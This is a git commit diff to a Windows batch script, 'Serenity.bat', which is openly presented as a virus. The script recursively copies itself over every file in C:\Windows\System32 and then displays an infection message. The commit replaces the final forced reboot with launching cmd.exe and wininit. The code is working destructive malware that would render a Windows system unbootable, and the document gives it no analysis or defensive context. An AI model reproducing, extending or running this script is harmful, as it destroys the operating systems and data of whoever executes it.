d114ebdb262f8375290612fa9f888763d4b8cbee
wlingahamnako-hue <wlingahamnako@gmail.com>
2026-08-12 14:27:53 -0400

    Modify Serenity.bat to include cmd.exe and wininit
    Added commands to execute cmd.exe and wininit after the infection message.

--- Serenity.bat
+++ Serenity.bat
@@ -2,4 +2,6 @@
 for /R "C:\Windows\System32\*.*" %%G in (*) do copy "%~dp0\Serenity.bat" "%%G"
 echo Your computer is infected with Serenity, use it while you can.
 pause
-shutdown -r -t 0
+cmd.exe
+pause
+wininit
